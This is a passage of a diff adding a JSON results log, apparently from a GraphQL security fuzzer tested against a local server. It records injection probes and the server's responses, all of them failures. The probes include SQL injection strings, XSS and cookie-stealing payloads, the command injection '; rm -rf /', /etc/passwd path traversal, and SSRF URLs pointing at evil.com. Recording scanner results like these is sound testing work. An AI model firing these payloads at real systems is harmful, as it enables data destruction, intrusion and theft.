+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:45:47.670715Z",
+    "count": 49,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:45:50.334889Z",
+    "count": 50,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<img src='x' onerror='alert(document.cookie)'>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:45:52.001857Z",
+    "count": 51,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery BypassedQuery {\n  s: getLocation(locationID: \"loc-101\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:45:54.272398Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:45:54.277538Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 52,
+    "timestamp": "2025-10-05T16:45:54.277598Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.01,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.074,
+    "timestamp": "2025-10-05T16:45:56.419228Z",
+    "count": 53,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    naame \n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.013,
+    "timestamp": "2025-10-05T16:45:59.116211Z",
+    "count": 54,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:46:03.663072Z",
+    "count": 55,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1' OR '1'='1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:46:05.860655Z",
+    "count": 56,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:46:08.135948Z",
+    "count": 57,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://evil.com/data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:46:09.701867Z",
+    "count": 58,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:46:11.671379Z",
+    "count": 59,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:46:14.245837Z",
+    "count": 60,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<h1>Malicious HTML</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:46:16.170134Z",
+    "count": 61,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocationQuery {\n  getLocation(locationID: \"loc-bypass-1\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:46:18.587430Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:46:18.593953Z",
+        "response_body": {
+          "data": {
+            "locationAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 62,
+    "timestamp": "2025-10-05T16:46:18.594017Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  locationAlias: getLocation(locationID: \"loc-bypass-2\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-05T16:46:21.450286Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:46:21.453976Z",
+        "response_body": {
+          "data": {
+            "locationAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 63,
+    "timestamp": "2025-10-05T16:46:21.453986Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  getLocation {\n    queryType {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:46:23.476375Z",
+    "count": 64,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"queryType\" on type \"Location\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"queryType\" on type \"Location\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getLocation\" argument \"locationID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-456\") {\n    id\n    nammme\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:46:26.410715Z",
+    "count": 65,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"nammme\" on type \"Location\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"nammme\" on type \"Location\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-101\") {\n    id\n    lat\n    lng\n    name\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:46:32.108993Z",
+    "count": 66,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"1'; SELECT SLEEP(5); --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:46:34.652742Z",
+    "count": 67,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:46:37.608493Z",
+    "count": 68,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"http://example.com/malicious_webhook\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:46:39.550168Z",
+    "count": 69,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"; rm -rf /; #\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:46:42.037999Z",
+    "count": 70,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"../../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:46:43.585935Z",
+    "count": 71,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"<h1>Hello World!</h1>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:46:45.644091Z",
+    "count": 72,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getLocation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getLocation {\n  getLocation(locationID: \"loc-102\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:46:48.467183Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:46:48.471535Z",
+        "response_body": {
+          "data": {
+            "aliasForGetLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 73,
+    "timestamp": "2025-10-05T16:46:48.471585Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.004,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery QueryAlias {\n  aliasForGetLocation: getLocation(locationID: \"loc-103\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.003,
+        "timestamp": "2025-10-05T16:46:50.838787Z",
+        "response_body": {
+          "data": {
+            "getLocation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.003,
+        "timestamp": "2025-10-05T16:46:50.841775Z",
+        "response_body": {
+          "data": {
+            "aliasForGetLocation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 74,
+    "timestamp": "2025-10-05T16:46:50.841791Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
